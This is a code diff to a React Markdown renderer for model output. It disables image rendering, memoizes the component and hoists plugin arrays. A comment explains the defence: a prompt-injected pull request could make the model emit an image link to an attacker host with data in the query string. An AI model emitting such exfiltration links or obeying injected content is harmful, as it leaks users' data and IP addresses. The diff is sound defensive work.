@@ -1,3 +1,4 @@
+import { memo, type ComponentProps } from 'react'
 import ReactMarkdown, { type Components } from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import rehypeHighlight from 'rehype-highlight'
@@ -13,11 +14,18 @@ import 'highlight.js/styles/github-dark.css'
  * (no rehype-raw), so model output can't inject markup. Unsafe link protocols
  * such as `javascript:` are stripped by its default urlTransform.
  *
- * Soft newlines inside a paragraph or list item are kept visible with
- * `whitespace-pre-line`, which matches how the same text reads on GitHub.
+ * Images are never rendered: a prompt-injected PR could make the model emit
+ * `![](https://attacker/?d=...)`, and the browser would fetch it on display
+ * (IP leak, tracking beacon, data in the query string). Alt text is shown
+ * instead.
  *
- * Not unit-tested under Jest: react-markdown is ESM-only. Keep this component
- * presentational; any logic belongs in src/lib.
+ * Soft newlines inside a paragraph are kept visible with `whitespace-pre-line`,
+ * which matches how the same text reads on GitHub. It is deliberately NOT on
+ * <li>: react-markdown keeps the "\n" text nodes between block children, and
+ * pre-line would turn each one into a blank line in loose/nested lists.
+ *
+ * Tests: tests/components.markdown.test.ts (see jest.config.js for the ESM
+ * transform). Keep this component presentational; logic belongs in src/lib.
  */
 
 /** react-markdown passes the hast `node` to every override; keep it off the DOM. */
@@ -40,7 +48,9 @@ const COMPONENTS: Components = {
   ol: props => (
     <ol {...omitNode(props)} className="mt-2 list-decimal space-y-1 pl-5" />
   ),
-  li: props => <li {...omitNode(props)} className="whitespace-pre-line" />,
+  li: props => <li {...omitNode(props)} />,
+  img: ({ alt }) =>
+    alt ? <span className="text-gray-500">[image: {alt}]</span> : null,
   a: props => (
     <a
       {...omitNode(props)}
@@ -77,7 +87,18 @@ const COMPONENTS: Components = {
   ),
 }
 
-export function Markdown({
+// Hoisted so the arrays are stable across renders.
+const REMARK_PLUGINS = [remarkGfm]
+const REHYPE_PLUGINS: NonNullable<
+  ComponentProps<typeof ReactMarkdown>['rehypePlugins']
+> = [
+  // detect:false → only fences with a language get colors; unlabeled blocks
+  // stay plain instead of being mis-guessed.
+  [rehypeHighlight, { detect: false, ignoreMissing: true }],
+]
+
+/** Memoized: parsing + highlighting is skipped when text/className are unchanged. */
+export const Markdown = memo(function Markdown({
   children,
   className = '',
 }: {
@@ -87,16 +108,12 @@ export function Markdown({
   return (
     <div className={className}>
       <ReactMarkdown
-        remarkPlugins={[remarkGfm]}
-        rehypePlugins={[
-          // detect:false → only fences with a language get colors; unlabeled
-          // blocks stay plain instead of being mis-guessed.
-          [rehypeHighlight, { detect: false, ignoreMissing: true }],
-        ]}
+        remarkPlugins={REMARK_PLUGINS}
+        rehypePlugins={REHYPE_PLUGINS}
         components={COMPONENTS}
       >
         {children}
       </ReactMarkdown>
     </div>
   )
-}
+})
